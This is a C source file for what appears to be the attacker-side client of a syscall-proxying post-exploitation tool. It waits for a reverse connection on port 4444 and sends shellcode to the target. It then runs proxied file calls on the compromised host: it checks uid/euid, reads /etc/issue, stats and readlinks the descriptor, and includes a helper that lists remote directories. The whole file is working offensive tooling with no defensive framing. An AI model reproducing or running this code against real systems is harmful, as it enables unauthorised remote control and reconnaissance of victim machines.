#include "libc_sp.h"

void mystat(int fd)
{
	struct stat sb;
	int ret;
	char path[256];
	char buff[1024];
	ret=sp_fstat(fd, &sb);
	if(ret!=0)
	{
		printf("[-] Error with sp_fstat: 0x%x\n", ret);
		return;
	}

	printf("fd: %d\n", fd);
	printf("File type:                ");
	switch (sb.st_mode & S_IFMT) {
		case S_IFBLK:  printf("block device\n");            break;
		case S_IFCHR:  printf("character device\n");        break;
		case S_IFDIR:  printf("directory\n");               break;
		case S_IFIFO:  printf("FIFO/pipe\n");               break;
		case S_IFLNK:  printf("symlink\n");                 break;
		case S_IFREG:  printf("regular file\n");            break;
		case S_IFSOCK: printf("socket\n");                  break;
		default:       printf("unknown?\n");                break;
	}

	printf("I-node number:            %ld\n", (long) sb.st_ino);

	printf("Mode:                     %lo (octal)\n",(unsigned long) sb.st_mode);

	printf("Link count:               %ld\n", (long) sb.st_nlink);
	printf("Ownership:                UID=%ld   GID=%ld\n",(long) sb.st_uid, (long) sb.st_gid);

	printf("Preferred I/O block size: %ld bytes\n",(long) sb.st_blksize);
	printf("File size:                %lld bytes\n",(long long) sb.st_size);
	printf("Blocks allocated:         %lld\n",(long long) sb.st_blocks);

	printf("Last status change:       %s", ctime(&sb.st_ctime));
	printf("Last file access:         %s", ctime(&sb.st_atime));
	printf("Last file modification:   %s", ctime(&sb.st_mtime));

	printf("[*] Trying readlink on fd: %d\n", fd);
	snprintf(path, sizeof(path)-1, "/proc/self/fd/%d", fd);
	ret=sp_readlink(path, buff, sizeof(buff)-1);
	if(ret<0)
		printf("[-] Error with readlink: 0x%x\n", ret);
	else
		printf("fd 1 is: %s\n", buff);
	return;
}


void mylist(char * path)
{
	int fd, file, ret;
	struct dirent dir;
	char buff[1024];

	printf("[*] Listing %s\n", path);
	fd=sp_open(path, 0);
	if(fd<0)
	{
		printf("[-] Error with sp_open\n");
		return;
	}
	memset(&dir, 0, sizeof(dir));
	ret=sp_readdir(fd, &dir, 0);
	while(ret!=-1 && ret!=0)
	{
		printf("file: %s\n", &dir.d_name);
		ret=sp_readdir(fd, &dir, 0);
	}
	sp_close(fd);
	return;
}


int main(void)
{
	int i, fd, ret;
	char buffer[512];
	struct dirent dir;

	wait_connect_back(4444);
	send_sp_shellcode();

	sleep(1);
	printf("[*] uid: %d | euid: %d\n", sp_getuid(), sp_geteuid());

	//mylist("/");

	fd=sp_open("/etc/issue", O_RDONLY);
	if(fd<0)
	{
		printf("[-] Error with sp_open: 0x%x\n", fd);
		return 0;
	}
	i=0;
	do
	{
		ret=sp_read(fd, buffer+i, sizeof(buffer)-i-1);
		if(ret<0)
			break;
		i+=ret;
	}while(ret!=0);
	printf("[*] /etc/issue contents:\n%s\n", buffer);
	mystat(fd);
	sp_close(fd);

	return 0;
}


